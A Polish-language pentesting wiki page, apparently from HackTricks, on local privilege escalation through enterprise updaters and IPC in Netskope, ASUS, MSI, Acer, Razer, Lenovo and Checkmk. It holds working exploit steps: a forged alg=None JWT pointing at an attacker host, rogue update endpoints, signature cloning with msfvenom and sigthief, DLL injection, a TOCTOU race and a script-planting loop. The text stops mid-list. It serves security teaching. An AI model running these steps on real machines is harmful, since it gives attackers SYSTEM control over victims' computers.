# Nadużywanie korporacyjnych auto-updaterów i uprzywilejowanego IPC (np. Netskope, ASUS i MSI)

{{#include ../../banners/hacktricks-training.md}}

Ta strona uogólnia klasę łańcuchów eskalacji uprawnień lokalnych w Windows, znalezionych w korporacyjnych agentach i updaterach endpointów, które udostępniają łatwo dostępny interfejs IPC oraz uprzywilejowany mechanizm aktualizacji. Reprezentatywnym przykładem jest Netskope Client for Windows < R129 (CVE-2025-0309), w którym użytkownik o niskich uprawnieniach może wymusić rejestrację w kontrolowanym przez atakującego serwerze, a następnie dostarczyć złośliwy MSI, który usługa instaluje jako SYSTEM.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Kluczowe pomysły, które można wykorzystać przeciwko podobnym produktom:
- Nadużyj localhost IPC uprzywilejowanej usługi, aby wymusić ponowną rejestrację lub rekonfigurację do serwera atakującego.
- Zaimplementuj endpointy aktualizacji dostawcy, dostarcz nieautoryzowany Trusted Root CA i wskaż updaterowi złośliwy „podpisany” pakiet.
- Omiń słabe sprawdzanie podpisującego (listy dozwolonych CN), opcjonalne flagi digest oraz luźno sprawdzane właściwości MSI.
- Jeśli IPC jest „szyfrowane”, wyprowadź klucz/IV z publicznie dostępnych identyfikatorów maszyny zapisanych w rejestrze.
- Jeśli usługa ogranicza dostęp na podstawie ścieżki obrazu/nazwy procesu, wstrzyknij kod do procesu z listy dozwolonych albo uruchom taki proces w stanie wstrzymania i załaduj swoją DLL przez minimalną modyfikację kontekstu wątku.

Niestandardowe lokalne usługi TCP wymagają takiej samej weryfikacji tożsamości i granic danych wejściowych, nawet gdy wymagają PIN-u lub innych danych uwierzytelniających aplikacji. Ustal, z jakim procesem i efektywnym kontem usługi powiązany jest listener, a następnie sprawdź dokładnie wdrożony plik binarny/wersję oraz to, czy pola kontrolowane przez wywołującego są sprawdzane pod kątem długości, zanim zostaną skopiowane do buforów o stałym rozmiarze lub użyte do utworzenia polecenia procesu potomnego. [Wytyczne Microsoft dotyczące przepełnienia bufora](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) wyjaśniają, dlaczego niesprawdzone dane zewnętrzne są niebezpieczne w uprzywilejowanym kodzie natywnym. Listener loopback, zakodowane na stałe dane uwierzytelniające ani sama nazwa procesu nie dowodzą występowania uszkodzenia pamięci ani możliwości wykonania kodu jako SYSTEM; osiągalność, autoryzacja, ścieżka kodu i mechanizmy ochronne to odrębne warunki. Rutynowe rozpoznanie powinno być pasywne — nie wysyłaj do działającej usługi danych wejściowych o długości mogącej spowodować awarię.

---
## 1) Wymuszanie rejestracji na serwerze atakującego przez localhost IPC

Wiele agentów zawiera proces interfejsu użytkownika działający w trybie użytkownika, który komunikuje się z usługą SYSTEM przez localhost TCP, używając JSON.

Zaobserwowano w Netskope:
- UI: stAgentUI (niska integralność) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Przebieg exploita:
1) Utwórz token rejestracyjny JWT, którego claims kontrolują host zaplecza (np. AddonUrl). Użyj alg=None, aby podpis nie był wymagany.
2) Wyślij komunikat IPC wywołujący polecenie rejestracji, wraz z JWT i nazwą tenanta:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Usługa zaczyna wysyłać żądania do Twojego złośliwego serwera w celu pobrania danych rejestracyjnych/konfiguracji, np.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Uwagi:
- Jeśli weryfikacja wywołującego opiera się na ścieżce/nazwie, wyślij żądanie z dozwolonego pliku binarnego dostawcy (zob. §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Przejęcie kanału aktualizacji w celu uruchomienia kodu jako SYSTEM

Gdy klient połączy się z Twoim serwerem, zaimplementuj oczekiwane punkty końcowe i przekieruj go do złośliwego pliku MSI. Typowa sekwencja:

1) /v2/config/org/clientconfig → Zwróć konfigurację JSON z bardzo krótkim interwałem aktualizatora, np.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Zwróć certyfikat CA w formacie PEM. Usługa instaluje go w magazynie Trusted Root komputera lokalnego.
3) /v2/checkupdate → Podaj metadane wskazujące na złośliwy plik MSI i fałszywą wersję.

Omijanie typowych kontroli spotykanych w praktyce:
- Lista dozwolonych CN wystawcy: usługa może sprawdzać jedynie, czy CN podmiotu jest równy „netSkope Inc” lub „Netskope, Inc.”. Twoje nieautoryzowane CA może wystawić certyfikat leaf z takim CN i podpisać plik MSI.
- Właściwość CERT_DIGEST: dodaj do pliku MSI nieszkodliwą właściwość o nazwie CERT_DIGEST. Podczas instalacji nie jest ona weryfikowana.
- Opcjonalna weryfikacja digestu: flaga konfiguracji (np. check_msi_digest=false) wyłącza dodatkową weryfikację kryptograficzną.

Rezultat: usługa SYSTEM instaluje plik MSI z lokalizacji
C:\ProgramData\Netskope\stAgent\data\*.msi
i wykonuje dowolny kod jako NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Wniosek z obchodzenia poprawek: jeśli dostawca odpowie, dodając do listy dozwolonych niewielki zestaw „zaufanych” domen zamiast kryptograficznie uwierzytelniać źródło aktualizacji, poszukaj należących do dostawcy serwerów przekierowujących lub reverse proxy, które nadal pozwalają kierować ruch. W przypadku Netskope publiczne późniejsze badania wykazały, że lista dozwolonych z czasów R129 nadal mogła zostać wykorzystana przez `rproxy.goskope.com`, który przekazywał treści z kontrolowanej przez atakującego usługi Azure App Service. Traktuj listy dozwolonych nazw hostów jako przeszkodę, a nie granicę zaufania.<sup>[[14]](#references)</sup>

---
## 3) Fałszowanie zaszyfrowanych żądań IPC (jeśli występują)

Od wersji R127 Netskope opakowywał JSON IPC w polu encryptData, które wygląda jak Base64. Analiza wsteczna wykazała, że używany jest AES z kluczem/IV wyprowadzanymi z wartości rejestru dostępnych dla każdego użytkownika:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Atakujący mogą odtworzyć szyfrowanie i wysyłać prawidłowe zaszyfrowane polecenia ze standardowego konta użytkownika.<sup>[[1]](#references)[[2]](#references)</sup> Ogólna wskazówka: jeśli agent nagle zaczyna „szyfrować” IPC, poszukaj identyfikatorów urządzenia, GUID produktu i identyfikatorów instalacji w HKLM — mogą służyć jako materiał kluczowy.

---
## 4) Omijanie list dozwolonych wywołujących IPC (kontrola ścieżki/nazwy)

Niektóre usługi próbują uwierzytelniać drugą stronę, ustalając PID połączenia TCP i porównując ścieżkę/nazwę obrazu z listą dozwolonych plików binarnych dostawcy w Program Files (np. stagentui.exe, bwansvc.exe, epdlp.exe).

Dwa praktyczne sposoby obejścia:
- Wstrzyknięcie DLL do procesu z listy dozwolonych (np. nsdiag.exe) i przekazywanie żądań IPC z jego wnętrza.
- Uruchomienie pliku binarnego z listy dozwolonych w stanie wstrzymania i załadowanie proxy DLL bez użycia CreateRemoteThread (zob. §5), aby spełnić wymogi sterownika dotyczące ochrony przed manipulacją.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Wstrzykiwanie zgodne z ochroną przed manipulacją: wstrzymany proces + modyfikacja NtContinue

Produkty często zawierają sterownik minifiltra/OB callbacks (np. Stadrv), który usuwa niebezpieczne uprawnienia z uchwytów do chronionych procesów:
- Proces: usuwa PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Wątek: ogranicza uprawnienia do THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Niezawodny loader w trybie użytkownika, który respektuje te ograniczenia:
1) Wywołaj CreateProcess dla pliku binarnego dostawcy z flagą CREATE_SUSPENDED.
2) Uzyskaj uchwyty, które nadal są dozwolone: PROCESS_VM_WRITE | PROCESS_VM_OPERATION dla procesu oraz uchwyt wątku z THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (lub tylko THREAD_RESUME, jeśli modyfikujesz kod pod znanym RIP).
3) Nadpisz ntdll!NtContinue (lub inny wczesny, gwarantowanie załadowany thunk) krótkim stubem, który wywołuje LoadLibraryW dla ścieżki do Twojej DLL, a następnie wraca.
4) Wywołaj ResumeThread, aby uruchomić stub w procesie i załadować Twoją DLL.

Ponieważ nie użyto PROCESS_CREATE_THREAD ani PROCESS_SUSPEND_RESUME w odniesieniu do już chronionego procesu (to Ty go utworzyłeś), zasady sterownika są spełnione.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktyczne narzędzia
- NachoVPN (wtyczka Netskope) automatyzuje tworzenie nieautoryzowanego CA, podpisywanie złośliwych plików MSI i udostępnia wymagane endpointy: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope to niestandardowy klient IPC, który tworzy dowolne komunikaty IPC (opcjonalnie szyfrowane AES) i zawiera mechanizm wstrzykiwania do wstrzymanego procesu, aby wysyłać żądania z pliku binarnego z listy dozwolonych.<sup>[[4]](#references)</sup>

## 7) Szybki proces wstępnej analizy nieznanych mechanizmów aktualizacji/IPC

W przypadku nowego agenta endpointowego lub zestawu „pomocniczych” narzędzi do płyty głównej zazwyczaj wystarczy szybki proces, by ocenić, czy masz do czynienia z obiecującym celem do eskalacji uprawnień:<sup>[[6]](#references)</sup>

1) Wylistuj nasłuchujące porty loopback i powiąż je z procesami dostawcy:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Wylicz potencjalne nazwane potoki:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Wydobądź dane routingu przechowywane w rejestrze, używane przez serwery IPC oparte na pluginach:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Najpierw wyodrębnij nazwy endpointów, klucze JSON i identyfikatory poleceń z klienta działającego w trybie użytkownika. Spakowane frontendowe aplikacje Electron/.NET często leakują pełny schemat:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Szukaj rzeczywistego predykatu zaufania, a nie tylko ścieżki kodu, która ostatecznie uruchamia proces:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Warto nadać priorytet takim wzorcom:
- `CryptQueryObject`/parsowanie certyfikatów bez `WinVerifyTrust` zwykle oznacza, że „certyfikat istnieje” uznano za „certyfikat jest zaufany”, co umożliwia klonowanie certyfikatów lub inne sztuczki z fałszywym podpisującym.
- Sprawdzanie podciągów lub sufiksów w `Origin`, `Referer`, URL-ach pobierania, nazwach procesów lub CN-ach podpisujących nie jest uwierzytelnianiem. `contains(".vendor.com")` zwykle da się wykorzystać za pomocą kontrolowanych przez atakującego domen podszywających się pod właściwą domenę.
- Jeśli GUI o niskich uprawnieniach decyduje, że „plik jest zaufany”, a broker SYSTEM jedynie korzysta z tego wyniku, załatanie lub ponowna implementacja DLL/JS po stronie klienta często całkowicie omija tę granicę (podział walidacji w stylu Razer).
- Jeśli broker kopiuje payload do `%TEMP%`/`C:\Windows\Temp`, a następnie waliduje go lub planuje jego wykonanie z tej ścieżki, od razu sprawdź okna TOCTOU umożliwiające podmianę oraz sąsiednie moduły wtyczek udostępniające alternatywne wrappery `ExecuteTask()` z mniej restrykcyjnymi kontrolami.<sup>[[6]](#references)</sup>

W przypadku celów intensywnie korzystających z named pipes PipeViewer pozwala szybko znaleźć słabe DACL-e i zdalnie dostępne pipes, zanim zaczniesz szczegółowo analizować ich protokół.<sup>[[11]](#references)</sup>

Jeśli cel uwierzytelnia wywołujących wyłącznie na podstawie PID, ścieżki obrazu lub nazwy procesu, potraktuj to jako przeszkodę, a nie granicę zabezpieczeń: wstrzyknięcie kodu do legalnego klienta albo nawiązanie połączenia z procesu znajdującego się na liście dozwolonych często wystarczy, by przejść kontrole serwera. W przypadku named pipes [ta strona o podszywaniu się pod klienta i nadużywaniu pipe](named-pipe-client-impersonation.md) dokładniej opisuje tę technikę.

W przypadku uprzywilejowanego **brokera czyszczenia lub przywracania** sprawdź granicę zaufania dotyczącą ścieżek, a także ACL pipe. Wywołujący o niższych uprawnieniach może być w stanie wybrać miejsce przywracania lub zmienić nazwę artefaktu kopii zapasowej w katalogu współdzielonym, nawet jeśli plik wykonywalny usługi i jej katalog instalacyjny są chronione. Osobno potwierdź, że wywołujący może uruchomić polecenie przywracania, zmodyfikować dokładny przygotowany plik wejściowy lub jego nazwę, że broker działa z wyższymi uprawnieniami oraz że operacja przywracania rzeczywiście zapisuje dane w wybranej chronionej lokalizacji. Sam zapisywalny katalog tymczasowy lub dostępny do odczytu pipe nie dowodzi możliwości dowolnego zapisu z podwyższonymi uprawnieniami; mapowanie lokalizacji docelowej i działanie usługi wymagają przeglądu kodu lub kontrolowanych testów. Nie uruchamiaj nieznanego polecenia czyszczenia podczas pasywnego rozpoznania, ponieważ może ono usunąć pliki użytkownika.

---
## 8) Modular add-in brokers authenticated only by vendor signatures (Lenovo Vantage pattern)

Nowszym wariantem wartym sprawdzenia jest **signed-client RPC broker**: proces desktopowy Lenovo o niskich uprawnieniach komunikuje się z usługą SYSTEM, a usługa kieruje polecenia JSON do zestawu dodatków opisanych w XML w `%ProgramData%`. Gdy uda się uzyskać wykonanie kodu **wewnątrz dowolnego zaakceptowanego, podpisanego klienta**, każdy kontrakt `runas="system"` staje się częścią powierzchni ataku.<sup>[[15]](#references)</sup>

Wysokowartościowe techniki zaobserwowane w badaniach Lenovo Vantage:
- **Zaufanie do wywołującego, ponieważ jest podpisany przez producenta**: badacze uzyskali uwierzytelniony kontekst, kopiując podpisany przez Lenovo plik EXE do zapisywalnego katalogu i spełniając warunki DLL side-load (`profapi.dll`), co pozwoliło uruchomić dowolny kod wewnątrz klienta już zaufanego przez usługę.
- **Odkrywanie powierzchni ataku na podstawie manifestów**: dodatki są deklarowane w `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; kilka kontraktów działa jako `SYSTEM`, więc wyliczenie tych manifestów często ujawnia rzeczywiste uprzywilejowane operacje szybciej niż analiza wsteczna samego brokera.
- **Błędy poszczególnych poleceń za uwierzytelnionym kanałem**: po uzyskaniu dostępu do zaufanego klienta publiczne badania ujawniły path traversal i race conditions w operacjach aktualizacji/instalacji, nadużywanie raw SQL w uprzywilejowanych bazach ustawień oraz kontrole ścieżek rejestru oparte na podciągach, które umożliwiały zapisy poza zamierzonym hive.

Przydatne rozpoznanie celu:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Praktyczny wniosek: gdy pakiet narzędzi pomocniczych udostępnia brokera, który najpierw uwierzytelnia **proces wywołujący**, a dopiero potem kieruje żądania do dziesiątek poleceń wtyczek/dodatków, nie poprzestawaj na obejściu wstępnego sprawdzenia zaufania. Zrzuć manifest/tabelę kontraktów i fuzzuj niezależnie każde polecenie o wysokich uprawnieniach; uwierzytelniony kanał zwykle skrywa kilka błędów drugiego etapu.

---
## 1) CSRF z przeglądarki do localhost przeciwko uprzywilejowanym API HTTP (ASUS DriverHub)

DriverHub dostarcza usługę HTTP działającą w trybie użytkownika (ADU.exe) pod adresem 127.0.0.1:53000, która oczekuje wywołań z przeglądarki pochodzących z https://driverhub.asus.com. Filtr Origin po prostu wykonuje `string_contains(".asus.com")` na nagłówku Origin oraz na adresach URL pobierania udostępnianych przez `/asus/v1.0/*`. Dlatego dowolny host kontrolowany przez atakującego, taki jak `https://driverhub.asus.com.attacker.tld`, przechodzi sprawdzenie i może wysyłać z JavaScript żądania zmieniające stan.<sup>[[6]](#references)</sup> Więcej wzorców obejścia znajdziesz w [podstawach CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md).

Praktyczny przebieg:
1) Zarejestruj domenę zawierającą `.asus.com` i umieść na niej złośliwą stronę internetową.
2) Użyj `fetch` lub XHR, aby wywołać uprzywilejowany endpoint (np. `Reboot`, `UpdateApp`) pod adresem `http://127.0.0.1:53000`.
3) Wyślij treść JSON oczekiwaną przez handlera — spakowany JS frontendu pokazuje poniższy schemat.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Nawet pokazany poniżej interfejs CLI PowerShell działa poprawnie, gdy nagłówek Origin zostanie sfałszowany na zaufaną wartość:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Każda wizyta w witrynie atakującego staje się więc lokalnym CSRF wymagającym 1 kliknięcia (lub 0 kliknięć dzięki `onload`), który uruchamia helper działający jako SYSTEM.

---
## 2) Niebezpieczna weryfikacja code-signing i klonowanie certyfikatu (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` pobiera dowolne pliki wykonywalne określone w treści JSON i zapisuje je w pamięci podręcznej w `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Walidacja URL pobierania używa tej samej logiki opartej na podciągu, więc `http://updates.asus.com.attacker.tld:8000/payload.exe` zostaje zaakceptowany. Po pobraniu ADU.exe jedynie sprawdza, czy plik PE ma podpis i czy ciąg Subject pasuje do ASUS, a następnie go uruchamia — bez `WinVerifyTrust` i bez walidacji łańcucha certyfikatów.

Aby wykorzystać ten przepływ:
1) Utwórz payload (np. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Sklonuj do niego podpis ASUS (np. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Udostępnij `pwn.exe` w domenie podszywającej się pod `.asus.com` i wywołaj UpdateApp za pomocą opisanego wyżej browser CSRF.

Ponieważ zarówno filtry Origin, jak i URL opierają się na podciągach, a weryfikacja podpisującego jedynie porównuje ciągi, DriverHub pobiera i uruchamia plik binarny atakującego z podwyższonymi uprawnieniami.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU w ścieżkach kopiowania/wykonywania updatera (MSI Center CMD_AutoUpdateSDK)

Usługa SYSTEM programu MSI Center udostępnia protokół TCP, w którym każda ramka ma format `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Główny komponent (Component ID `0f 27 00 00`) udostępnia `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Jego handler:
1) Kopiuje podany plik wykonywalny do `C:\Windows\Temp\MSI Center SDK.exe`.
2) Weryfikuje podpis za pomocą `CS_CommonAPI.EX_CA::Verify` (Subject certyfikatu musi być równy „MICRO-STAR INTERNATIONAL CO., LTD.”, a `WinVerifyTrust` musi zakończyć się powodzeniem).
3) Tworzy zaplanowane zadanie, które uruchamia plik tymczasowy jako SYSTEM z argumentami kontrolowanymi przez atakującego.

Skopiowany plik nie jest blokowany między weryfikacją a wywołaniem `ExecuteTask()`. Atakujący może:
- Wysłać ramkę A wskazującą prawidłowy plik binarny podpisany przez MSI (co gwarantuje zaliczenie weryfikacji podpisu i dodanie zadania do kolejki).
- Równolegle wysyłać wielokrotnie ramkę B wskazującą na złośliwy payload, nadpisując `MSI Center SDK.exe` zaraz po zakończeniu weryfikacji.

Gdy scheduler uruchomi zadanie, wykona nadpisany payload jako SYSTEM, mimo że zweryfikowano oryginalny plik. Niezawodne wykorzystanie wymaga dwóch goroutines/wątków, które wielokrotnie wysyłają CMD_AutoUpdateSDK, aż uda się trafić w okno TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Wykorzystywanie niestandardowego IPC na poziomie SYSTEM i impersonacji (MSI Center + Acer Control Centre)

### Zestawy komend TCP MSI Center
- Każda wtyczka/DLL załadowana przez `MSI.CentralServer.exe` otrzymuje Component ID zapisany w `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Pierwsze 4 bajty ramki wskazują komponent, co pozwala atakującym kierować komendy do dowolnych modułów.
- Wtyczki mogą definiować własne task runnery. `Support\API_Support.dll` udostępnia `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` i bezpośrednio wywołuje `API_Support.EX_Task::ExecuteTask()` **bez weryfikacji podpisu** — każdy użytkownik lokalny może wskazać `C:\Users\<user>\Desktop\payload.exe` i deterministycznie uzyskać wykonanie jako SYSTEM.
- Przechwycenie ruchu loopback za pomocą Wireshark lub instrumentacja binariów .NET w dnSpy szybko ujawniają mapowanie Component ↔ command; następnie można odtwarzać ramki za pomocą własnych klientów Go/Python.<sup>[[6]](#references)</sup>

### Named pipes Acer Control Centre i poziomy impersonacji
- `ACCSvc.exe` (SYSTEM) udostępnia `\\.\pipe\treadstone_service_LightMode`, a jego dyskrecjonalna ACL zezwala klientom zdalnym (np. `\\TARGET\pipe\treadstone_service_LightMode`) na dostęp. Wysłanie command ID `7` ze ścieżką do pliku wywołuje procedurę usługi uruchamiającą proces.
- Biblioteka klienta serializuje bajt terminatora magicznego (113) wraz z argumentami. Instrumentacja dynamiczna za pomocą Frida/`TsDotNetLib` (wskazówki dotyczące instrumentacji znajdziesz w [Narzędzia i podstawowe metody reversing](../../reversing/reversing-tools-basic-methods/README.md)) pokazuje, że natywny handler mapuje tę wartość na `SECURITY_IMPERSONATION_LEVEL` i SID integralności przed wywołaniem `CreateProcessAsUser`.
- Zamiana 113 (`0x71`) na 114 (`0x72`) przełącza do ogólnej gałęzi, która zachowuje pełny token SYSTEM i ustawia SID wysokiej integralności (`S-1-16-12288`). Uruchomiony plik binarny działa więc jako nieograniczony SYSTEM, zarówno lokalnie, jak i między komputerami.
- Połącz to z udostępnioną flagą instalatora (`Setup.exe -nocheck`), aby uruchomić ACC nawet na maszynach wirtualnych w labie i testować pipe bez sprzętu producenta.<sup>[[6]](#references)</sup>

Te błędy IPC pokazują, dlaczego usługi localhost muszą wymagać wzajemnego uwierzytelniania (ALPC SIDs, filtry `ImpersonationLevel=Impersonation`, filtrowanie tokenów) oraz dlaczego helpery „run arbitrary binary” we wszystkich modułach muszą stosować te same weryfikacje podpisującego.

---
## 3) Helpery COM/IPC typu „elevator” oparte na słabej walidacji w user-mode (Razer Synapse 4)

Razer Synapse 4 wprowadził kolejny przydatny wzorzec z tej grupy: użytkownik o niskich uprawnieniach może poprosić helper COM o uruchomienie procesu przez `RzUtility.Elevator`, podczas gdy decyzja o zaufaniu jest przekazana bibliotece DLL działającej w user-mode (`simple_service.dll`), zamiast być solidnie egzekwowana w uprzywilejowanej granicy.

Zaobserwowana ścieżka wykorzystania:
- Utwórz instancję obiektu COM `RzUtility.Elevator`.
- Wywołaj `LaunchProcessNoWait(<path>, "", 1)`, aby zażądać uruchomienia z podwyższonymi uprawnieniami.
- W publicznym PoC bramka weryfikująca podpis PE w `simple_service.dll` jest patchowana przed wysłaniem żądania, co pozwala uruchomić dowolny plik wykonywalny wybrany przez atakującego.<sup>[[6]](#references)[[10]](#references)</sup>

Minimalne wywołanie PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Ogólny wniosek: podczas analizowania „helper” suites nie poprzestawaj na localhost TCP ani named pipes. Sprawdź, czy istnieją klasy COM o nazwach takich jak `Elevator`, `Launcher`, `Updater` lub `Utility`, a następnie zweryfikuj, czy uprzywilejowana usługa sama sprawdza plik binarny wskazany jako cel, czy tylko ufa wynikowi obliczonemu przez podatną na modyfikacje bibliotekę DLL klienta w trybie użytkownika. Ten wzorzec występuje nie tylko w Razer: każdy podział architektury, w którym broker o wysokich uprawnieniach korzysta z decyzji allow/deny pochodzącej z części o niskich uprawnieniach, może stanowić powierzchnię privesc.


---
## Przewidywalne wykonanie tymczasowego skryptu podczas naprawy MSI (Checkmk Agent / CVE-2024-0670)

Niektóre agenty Windows nadal wykonują uprzywilejowane operacje, zapisując tymczasowy plik `.cmd` w `C:\Windows\Temp` i uruchamiając go jako `SYSTEM`. Jeśli nazwa pliku jest przewidywalna, a usługa nie odtwarza bezpiecznie istniejących plików, użytkownik o niskich uprawnieniach może wcześniej utworzyć przyszły plik tymczasowy jako **tylko do odczytu**, przez co uprzywilejowany proces wykona zawartość kontrolowaną przez atakującego zamiast własnego skryptu.

Zaobserwowano w podatnych kompilacjach Checkmk Agent:
- wzorzec nazwy pliku tymczasowego: `cmk_all_<PID>_1.cmd`
- dotknięte gałęzie: `2.0.0`, `2.1.0`, `2.2.0`
- wyzwalacz: **naprawa** MSI buforowanego pakietu agenta<sup>[[8]](#references)[[9]](#references)</sup>

Praktyczny przebieg:
1. Oszacuj realistyczny zakres PID na podstawie bieżących identyfikatorów procesów lub PID działającego agenta.
2. Zapisz krótki payload `.cmd` w **ASCII** (`Set-Content -Encoding Ascii` lub przekierowanie w `cmd.exe`; unikaj wyjścia PowerShell w UTF-16 dla plików wsadowych).
3. Utwórz pliki `C:\Windows\Temp\cmk_all_<PID>_1.cmd` dla kandydującego zakresu PID i ustaw każdy z nich jako tylko do odczytu.
4. Uruchom naprawę buforowanego MSI, aby uprzywilejowana usługa spróbowała ponownie utworzyć, a następnie wykonała tymczasowy skrypt.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Jeśli podatny produkt został zainstalowany za pomocą Windows Installer, przed uruchomieniem naprawy ustal, jakiemu produktowi odpowiada plik MSI o losowo wyglądającej nazwie w `C:\Windows\Installer`:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Notatki operacyjne:
- `qwinsta` jest przydatne, gdy `msiexec /fa` nie działa z nieinteraktywnej powłoki WinRM i trzeba sprawdzić, czy istniejąca sesja pulpitu lub sesja rozłączona może uruchomić naprawę we właściwy sposób.<sup>[[7]](#references)</sup>
- Ten schemat można uogólnić na inne agenty i aktualizatory punktów końcowych, które **umieszczają tymczasowe skrypty w lokalizacjach z prawem zapisu dla wszystkich, a później wykonują je jako SYSTEM**. Sprawdź, czy nazwy są przewidywalne, czy brakuje semantyki wyłącznego tworzenia oraz czy przepływy naprawy/aktualizacji można uruchomić na żądanie.

### Interaktywna naprawa instalatora i uprzywilejowana konsola

PDF24 Creator 11.15.1 pokazuje odrębne ryzyko związane z naprawą MSI: custom action instalująca drukarkę może podczas naprawy uruchomić widoczną konsolę z uprawnieniami SYSTEM. Dostawca zmienił instalator MSI w wersji 11.15.2, aby rozwiązać ten problem. Starsza wersja produktu jest jedynie tropem do wstępnej analizy. Sprawdź zarejestrowany lub dostępny pakiet MSI, czy ten użytkownik może rozpocząć naprawę, czy obecna jest podatna custom action i opóźnienie związane z plikiem logu oraz czy interaktywny pulpit może wyświetlić konsolę. Zgłaszane opóźnienie uzyskano za pomocą oplock na `faxPrnInst.log`; zwykłe prawo zapisu do pliku nie jest jedynym warunkiem dostępu. Nieinteraktywna powłoka, niedostępny pakiet lub załatany instalator mogą przerwać ten łańcuch. Ten problem nie zależy od `AlwaysInstallElevated` i różni się od podmiany przewidywalnego skryptu tymczasowego.

---
## Zdalne przejęcie łańcucha dostaw przez słabą walidację aktualizatora (WinGUp / Notepad++)

Od czerwca 2025 r. do grudnia 2025 r. napastnicy, którzy przejęli infrastrukturę hostingową obsługującą proces aktualizacji Notepad++, selektywnie dostarczali wybranym ofiarom złośliwe manifesty. Starsze aktualizatory oparte na WinGUp nie weryfikowały w pełni autentyczności aktualizacji, więc spreparowana odpowiedź XML mogła przekierować klientów na adresy URL kontrolowane przez napastników. Ponieważ klient akceptował treści HTTPS bez weryfikowania zarówno zaufanego łańcucha certyfikatów, jak i prawidłowego podpisu PE pobranego instalatora, ofiary pobierały i uruchamiały spreparowany trojanizowany plik NSIS `update.exe`.<sup>[[12]](#references)[[13]](#references)</sup>

Przebieg ataku (nie wymaga lokalnego exploita):
1. **Przechwycenie infrastruktury**: przejęcie CDN/hostingu i odpowiadanie na zapytania o aktualizacje metadanymi napastnika wskazującymi złośliwy adres URL pobierania.
